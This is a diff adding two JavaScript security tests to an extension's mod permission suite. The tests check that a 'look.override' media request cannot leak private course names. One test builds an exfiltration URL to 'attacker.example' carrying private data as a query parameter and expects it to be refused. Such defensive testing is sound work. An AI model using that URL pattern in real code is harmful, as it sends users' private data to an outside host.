@@ -390,6 +390,32 @@ test('a data mod cannot expose its cached data through a later frame-only update
   assert.equal((await call(e, 'storage.get', ['cached'])).value[0].name, 'PRIVATE', 'the Worker keeps its stored data');
 });
 
+test('a Look override cannot turn private data into an undeclared media request', async () => {
+  const e = env({ local: { seenCourses: { _1_1: { name: 'PRIVATE', site: SITE } } } });
+  const courses = await call(e, 'courses');
+  const src = `https://attacker.example/background.webp?name=${courses.value[0].name}`;
+  for (const type of ['image', 'video', 'lottie']) {
+    assert.deepEqual(await call(e, 'look.override', [{ bg: { media: { type, src } } }]), { ok: false, error: 'permission' }, type);
+  }
+});
+
+test('code media overrides reuse only the manifest source and type, including local files', async () => {
+  for (const src of ['https://media.example/background.webp', `file:${'a'.repeat(43)}`]) {
+    for (const type of ['image', 'video', 'lottie']) {
+      const parts = { bg: { media: { type, src } } };
+      const e = env({ record: rec({ manifest: { permissions: [], parts }, grants: {} }), local: { [`modPrivate:${ID}`]: true } });
+      const override = { bg: { media: { type, src, fit: 'contain', dim: 25, loop: false } } };
+      assert.deepEqual(await call(e, 'look.override', [override]), { ok: true, value: override }, 'the fixed source keeps runtime controls');
+      assert.deepEqual(await call(e, 'look.override', [{ bg: { media: { type: type === 'image' ? 'video' : 'image', src } } }]), { ok: false, error: 'permission' }, 'a source cannot change parser');
+    }
+  }
+  const e = env();
+  for (const src of ['https://api.weather.gov/background.webp?private=1', `file:${'b'.repeat(43)}`]) {
+    assert.deepEqual(await call(e, 'look.override', [{ bg: { media: { type: 'image', src } } }]), { ok: false, error: 'permission' }, 'neither a network grant nor a guessed local hash authorizes a dynamic source');
+  }
+  assert.deepEqual(await call(e, 'look.override', [null]), { ok: true, value: null });
+});
+
 
 for (const revoke of [{ [`mod:${ID}`]: { newValue: { enabled: false } } }, { modDev: { newValue: false } }]) test(`revocation ${Object.keys(revoke)[0]} aborts an in-flight broker fetch, including its response body`, async () => {
   const source = fs.readFileSync(path.join(__dirname, '../lib/background.js'), 'utf8');
